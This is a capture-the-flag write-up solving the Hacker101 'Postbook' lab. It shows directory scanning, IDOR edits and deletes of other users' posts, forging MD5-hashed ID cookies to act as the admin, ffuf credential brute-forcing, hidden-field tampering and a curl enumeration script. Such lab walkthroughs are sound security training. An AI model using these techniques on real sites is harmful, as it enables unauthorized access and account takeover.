# Hacker101 CTF: Postbook

<img width="754" height="438" alt="Снимок экрана 2026-01-03 170518" src="https://github.com/user-attachments/assets/0044f644-a679-40d4-975b-cdecdf79a566" />

## Flag №1:
First, we will create an account on the site. Go to the `Sign up` page, fill out the form, and submit it. So we successfully create a new user.
On the main page, we see posts from other users. The first post belongs to the admin. Let's view it and examine the navigation. What can we find in the URL structure:

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=view.php&id=1
```

We can see that `id=1` points to the post number and is passed as a GET parameter to `view.php`.
Now, use `dirb` to look for other accessible paths that could be useful for our attack.

```bash
>dirb https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/

The result: 
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php (CODE:200|SIZE:1610) 
==> DIRECTORY: https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/pages/            
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/php.ini (CODE:200|SIZE:69886)  
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/server-status (CODE:403|SIZE:330)
```

Looks on what we got in the `/pages/`:

<img width="729" height="476" alt="Снимок экрана 2026-01-03 170616" src="https://github.com/user-attachments/assets/730d0ce7-adf0-427a-94c2-bbf3f0927742" />

The scan reveals accessible directories and the Apache server version. Good! Let's attempt to edit the admin post using the previously discovered path. Replace `view` with `edit`:

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=edit.php&id=1
```
It works! We can modify admin and user posts without proper credentials. Let's edit a post, save the changes, and obtain the **FIRST FLAG**!

## Flag №2

Return to the main page where only two posts are visible. Click on the second post and notice that it ID is 3. Where is the post with ID 2?

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=edit.php&id=2
```
Change the ID parameter in the URL to reveal the post. It's the admin's hidden private diary. Make it visible by unchecking the box at the end of the form to obtain the **SECOND FLAG**.

<img width="348" height="402" alt="Снимок экрана 2026-01-03 170647" src="https://github.com/user-attachments/assets/35613538-5129-441a-ad79-4732bb5a1fd9" />

## Flag №3:

Let's continue exploring the paths discovered earlier. I suggest attempting to delete a post. First, create your own post and then delete it.
After performing these operations, examine the network request in the browser's developer tools (F12) or another location:

```html
https://8171ff60f81a1389b3cef8fd0183b0d1.ctf.hacker101.com/index.php?page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5
```

The ID appears to be encoded. Research identifies it as an MD5 hash. Using bash, compute the MD5 hash for the ID of an existing post.

```bash
>echo -n "2" | md5sum
>c81e728d9d4c2f636f067f89cc14862c
```

Click on the previous request, select `Copy as fetch`, paste it into the console, modify the ID parameter, and send the request. The response contains the **THIRD FLAG** in its payload section.

## Flag №4

Let's examine the request headers again. Press `F12`, analyze the request to the main page, and observe a cookie:

```html
cookie
_gid=GA1.2.1325341806.1767372463; _ga_K45575FWB8=GS2.1.s1767372467$o26$g1$t1767372601$j60$l0$h0; _ga=GA1.1.720269228.1759788108; _ga_W62NXF3JMB=GS2.1.s1767372603$o26$g1$t1767373015$j18$l0$h0; id=eccbc87e4b5ce2fe28308fd9f2a7baf3
```

The cookie `id=eccbc87e4b5ce2fe28308fd9f2a7baf3` is particularly interesting. It appears to be an MD5 hash, similar to the post IDs we encountered earlier, but this one identifies users. Recall that when editing the admin's post, we saw the admin has ID 1. Let's compute the MD5 hash of "1" and replace our cookie with it.

```bash
>echo -n "1" | md5sum
>c4ca4238a0b923820dcc509a6f75849b
```

Go to `DevTools → Application → Storage → Cookies`, find the id field, change its value to `c4ca4238a0b923820dcc509a6f75849b`, then refresh the main page to obtain the **FOURTH FLAG**.

### Flag №5

For this flag, we can use brute force or perform it manually, as it's relatively straightforward. If you use the provided hint, half the work is already done. For demonstration purposes, I'll use FFUF.

```bash
ffuf -u "https://255fccadb327f06c63eb4102eea3f4d9.ctf.hacker101.com/index.php?page=sign_in.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZ2Z" -w "/usr/share/wordlists/stupid_names.txt":FUZZ -w "/usr/share/wordlists/stupid_pass.txt":FUZ2Z -fr "PETA"
```
Here we select both username and password simultaneously. After completing the process, sign in with these credentials to obtain the **FIFTH FLAG**.

### Flag №6

We've already found flags for the `edit` and `delete` functionalities. What remains? Certainly! The post creation feature. Go and inspect the "Write a new post" link, where we'll find hidden form fields.

```html
 <input type="hidden" name="user_id" value="3" />
```

The `value="3"` represents the user ID. Create a test post and save it. We'll see two requests; the first one is what we need. In DevTools, use "Copy as fetch" on this request, change the value to 1 (the admin's ID), send it, and obtain the **SIXTH FLAG**.

### Flag №7

The seventh flag was straightforward, particularly with the hint: `189*5`.
Let's apply this calculation to a post ID. For demonstration, I used a simple bash script, but you can simply use 945 as the ID value.

```bash
#!/bin/bash

base_url="https://255fccadb327f06c63eb4102eea3f4d9.ctf.hacker101.com/index.php?page=view.php&id="
cookie="id=c81e728d9d4c2f636f067f89cc14862c"

for ((id=1000; id>=1; id--)); do
        url="${base_url}${id}"
        response=$(curl -s -H "Cookie: $cookie" "$url" --max-time 10 2>/dev/null)

        if [ -n "$response" ]; then
                if echo "$response" | grep -q '\^FLAG\^'; then
                        echo -e "\nFlag found: $id"
                        exit 0
                fi
        fi
done
echo “Flag not found”
exit 1
```

The 945-th post has our last flag!
 🚀 Congratulation! 🚀 
























